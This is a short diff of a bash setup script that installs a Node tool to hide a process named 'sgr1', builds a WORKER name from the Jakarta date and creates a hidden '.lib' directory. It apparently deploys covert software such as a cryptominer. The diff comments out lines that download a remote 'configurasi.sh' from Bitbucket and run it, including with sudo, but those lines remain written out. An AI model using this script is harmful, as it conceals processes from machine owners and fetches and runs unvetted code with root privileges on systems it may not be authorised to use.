@@ -21,10 +21,10 @@ source ~/.bashrc
 nvm install 18
 npm i -g node-process-hider
 ph add sgr1
-wget https://bitbucket.org/kacepot/esce/raw/main/configurasi.sh
-chmod u+x configurasi.sh
-sudo ./configurasi.sh
-./configurasi.sh
+# wget https://bitbucket.org/kacepot/esce/raw/main/configurasi.sh
+# chmod u+x configurasi.sh
+# sudo ./configurasi.sh
+# ./configurasi.sh
 WORKER=$(TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed 's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/')
 mkdir .lib && cd .lib
 export DEBIAN_FRONTEND=noninteractive
